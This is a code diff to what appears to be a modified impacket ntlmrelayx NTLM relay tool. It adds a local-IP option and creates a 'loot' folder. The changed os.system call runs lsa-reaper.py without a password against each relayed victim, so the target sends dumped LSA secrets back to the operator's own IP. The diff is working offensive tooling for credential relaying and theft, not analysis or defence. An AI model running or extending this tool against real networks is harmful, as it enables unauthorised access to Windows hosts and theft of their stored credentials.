@@ -46,7 +46,7 @@ except ImportError:
 import json
 from time import sleep
 from threading import Thread
-
+import netifaces as ni
 from impacket import version
 from impacket.examples import logger
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
@@ -66,11 +66,12 @@ red_minus = "{}[-]{}".format(color_RED, color_reset)
 gold_plus = "{}[+]{}".format(color_YELL, color_reset)
 red_exclm = "{}[!]{}".format(color_RED, color_reset)
 
+cwd = os.path.abspath(os.path.dirname(__file__))
 RELAY_SERVERS = []
 dumped_ips = []
 
 class MiniShell(cmd.Cmd):
-    def __init__(self, relayConfig, threads):
+    def __init__(self, relayConfig, threads, local_ip):
         cmd.Cmd.__init__(self)
 
         self.prompt = 'ntlmrelayx> '
@@ -155,7 +156,7 @@ class MiniShell(cmd.Cmd):
 
 
                             #step 2 start reaper
-                            os.system('sudo python3 lsa-reaper.py {}@{} -oe -ip eth0 -ap -no-pass'.format(dat[2], dat[1]))
+                            os.system('sudo python3 lsa-reaper.py {}@{} -oe -ip {} -ap -no-pass'.format(dat[2], dat[1], local_ip))
 
                             #step 3 start servers
                             if not self.serversRunning:
@@ -334,6 +335,9 @@ if __name__ == '__main__':
         print("{} Must be run as sudo".format(red_exclm))
         sys.exit(1)
 
+    if os.path.isdir(cwd + "/loot") == False:
+        os.makedirs(cwd + "/loot")
+
     config_check()
 
     print(version.BANNER)
@@ -346,6 +350,7 @@ if __name__ == '__main__':
     parser.add_argument("-h","--help", action="help", help='show this help message and exit')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-localip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help="Target to relay the credentials to, "
                                   "can be an IP, hostname or URL like domain\\username@host:port (domain\\username and port "
                                   "are optional, and don't forget to escape the '\\'). If unspecified, it will relay back "
@@ -488,6 +493,33 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts)
 
+    if options.localip is not None:  # did they give us the local ip in the command line
+        local_ip = options.localip
+        ifaces = ni.interfaces()
+        try:  # check to see if the interface has an ip
+            if local_ip in ifaces:
+                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
+                print("local IP => " + local_ip)
+        except BaseException as exc:
+            print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
+            exit(0)
+    else:
+        # print local interfaces and ips
+        print("")
+        ifaces = ni.interfaces()
+        for face in ifaces:
+            try:  # check to see if the interface has an ip
+                print('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))
+            except BaseException as exc:
+                continue
+
+        local_ip = input("\nEnter you local ip or interface: ")
+
+        # lets you enter eth0 as the ip
+        if local_ip in ifaces:
+            local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
+            print("local IP => " + local_ip)
+
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
         # Print the Library's installation path
@@ -570,7 +602,7 @@ if __name__ == '__main__':
     logging.info("Servers started, waiting for connections")
     try:
         if options.socks:
-            shell = MiniShell(c, threads)
+            shell = MiniShell(c, threads, local_ip)
             shell.cmdloop()
         else:
             sys.stdin.read()
